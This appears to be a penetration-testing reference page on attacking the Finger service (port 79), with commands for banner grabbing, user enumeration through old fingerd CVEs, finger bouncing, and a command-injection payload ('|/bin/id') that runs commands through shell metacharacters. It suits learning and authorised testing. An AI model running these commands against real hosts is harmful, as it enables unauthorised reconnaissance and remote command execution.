---
menu: "Finger - 79"
title: "Name/Finger (User Information Protocol) Service Enumeration"
weight: 79
---
# Finger (User Information Protocol)

## At a Glance

{{<highlight>}}
**Default Port**: 79
{{</highlight>}}

The Finger User Information Protocol ([RFC 1288](https://tools.ietf.org/html/rfc1288)),
is a simple protocol that provides
an interface to a remote user information program (RUIP).
[^rfc-1288]

## Banner Grabbing

#### Telnet

```sh
telnet {{< param "war.rhost" >}} 79
```

#### Netcat
```sh
echo "root" | nc -n {{< param "war.rhost" >}} 79
```

## Enumeration

### Tools

- [PentestMonkey - finger-user-enum](http://pentestmonkey.net/tools/user-enumeration/finger-user-enum)

### Fast Enum

```sh
for q in 'root' 'admin' 'user' '0' "'a b c d e f g h'" '|/bin/id';do echo "FINGER: $q"; finger "$q@{{< param "war.rhost" >}}"; echo -e "\n";done
```

#### Finger [^finger]

List logged users.

```sh
finger @{{< param "war.rhost" >}}
```
Finger a specific user.
```sh
finger -l root@{{< param "war.rhost" >}}
```
Enumerate users containing `user`.
```sh
finger -l user@{{< param "war.rhost" >}}
```

{{<note>}}
Try other words as: `admin`, `account` or `project`.
{{</note>}}

{{<details "Parameters">}}
- `-l`: Multi-line format. Displays all the information.
{{</details>}}

### Finger Zero [^cve-1999-0197]

`fingerd` may respond to `finger 0@<host>`
with information on some user accounts.

```sh
finger 0@{{< param "war.rhost" >}}
```

### Finger 'a b c d e f g h' [^cve-2001-1503]

`fingerd` may respond to `'a b c d e f g h'@<host>`
with information on all accounts.

```sh
finger 'a b c d e f g h'@{{< param "war.rhost" >}}
```

## Finger Bouncing [^finger-bouncing]

`finger` can be used to relay a request
to a different host
as if it were sent from that machine.

```sh
finger @{{< param "war.rhost" >}}@10.10.10.4
```

```sh
finger root@{{< param "war.rhost" >}}@10.10.10.4
```

## Command Execution [^cve-1999-0152]

`fingerd` allows remote command execution
through shell metacharacters.

```sh
finger "|/bin/id@{{< param "war.rhost" >}}"
```

## Finger Exploits Search

Refer to [Exploits Search]({{< ref "exploits-search">}})

[^rfc-1288]: “RFC 1288 - The Finger User Information Protocol.” IETF Tools, https://tools.ietf.org/html/rfc1288.
[^finger]: “Finger(1): User Info Lookup Program.” Linux Documentation, https://linux.die.net/man/1/finger.
[^cve-1999-0197]: “CVE - CVE-1999-0197.” CVE - Common Vulnerabilities and Exposures (CVE), https://cve.mitre.org/cgi-bin/cvename.cgi?name=1999-0197.
[^cve-2001-1503]: “CVE - CVE-2001-1503.” CVE - Common Vulnerabilities and Exposures (CVE), https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2001-1503.
[^finger-bouncing]: “‘Solaris 2.7 Allows Finger Bouncing’ .” SecuriTeam, 15 Jan. 1999, https://securiteam.com/exploits/2BUQ2RFQ0I/.
[^cve-1999-0152]: “CVE - CVE-1999-0152.” CVE -  Common Vulnerabilities and Exposures (CVE), https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-1999-0152.
